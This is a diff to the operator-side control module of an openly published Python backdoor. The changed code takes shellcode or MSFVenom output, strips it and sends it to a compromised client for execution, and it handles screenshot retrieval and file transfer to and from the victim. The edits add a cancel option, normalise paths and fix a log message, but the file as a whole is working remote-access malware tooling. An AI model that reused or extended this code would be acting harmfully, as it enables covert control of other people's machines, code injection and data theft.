@@ -6,11 +6,13 @@ https://github.com/xp4xbox/Python-Backdoor
 license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 """
 import logging
+import os
 import re
 import time
 
 from src import errors, helper
-from src.defs import *
+from src.command_defs import *
+from src.logger import LOGGER_ID
 
 
 class Control:
@@ -24,8 +26,8 @@ class Control:
         else:
             _encoding = "x86"
 
-        print(f"Enter {_encoding} byte encoded shellcode (\\x00\\...) or MSFVenom py output (enter 'done' when fully "
-              f"entered)")
+        print(f"Enter {_encoding} unicode bytes eg. (\\x00\\) shellcode or MSFVenom py output (enter 'done', "
+              f"or 'cancel' when fully entered)")
 
         data = r""
         while True:
@@ -33,13 +35,21 @@ class Control:
 
             if _input.lower() == "done":
                 break
+            elif _input.lower() == "cancel":
+                data = ""
+                break
             else:
                 data += _input
+
+        if data == "":
+            return
 
         # regular expression to parse the msfvenom output
         buf = re.sub("buf.?(\\+)?=.?.?.?\"", "", data)
         buf = buf.replace("\n", "")
         buf = buf.replace("\"", "")
+
+        test = bytearray(buf.encode().decode('unicode-escape').encode('ISO-8859-1'))
 
         self.socket.sendall_json(CLIENT_SHELLCODE, buf)
 
@@ -148,7 +158,7 @@ class Control:
         if rsp["key"] == SERVER_SCREENSHOT:
             buffer = rsp["value"]["buffer"]
 
-            self.logger.info(f"File size: {buffer} bytes")
+            self.logger.info(f"File size: {rsp['value']['value']} bytes")
 
             data = self.socket.recvall(buffer)
 
@@ -184,8 +194,8 @@ class Control:
             print(self.socket.recvall(rsp["value"]["buffer"]).decode())
 
     def receive_file(self):
-        file = helper.remove_quotes(input("Target file: "))
-        out_file = helper.remove_quotes(input("Output File: "))
+        file = os.path.normpath(helper.remove_quotes(input("Target file: ")))
+        out_file = os.path.normpath(helper.remove_quotes(input("Output File: ")))
 
         if file == "" or out_file == "":  # if the user left an input blank
             return
@@ -214,13 +224,13 @@ class Control:
             self.logger.error(rsp["value"])
 
     def send_file(self):
-        file = helper.remove_quotes(input("File to send: "))
+        file = os.path.normpath(helper.remove_quotes(input("File to send: ")))
 
         if not os.path.isfile(file):
             self.logger.error(f"File {file} not found")
             return
 
-        out_file = helper.remove_quotes(input("Output File: "))
+        out_file = os.path.normpath(helper.remove_quotes(input("Output File: ")))
 
         if out_file == "":  # if the input is blank
             return
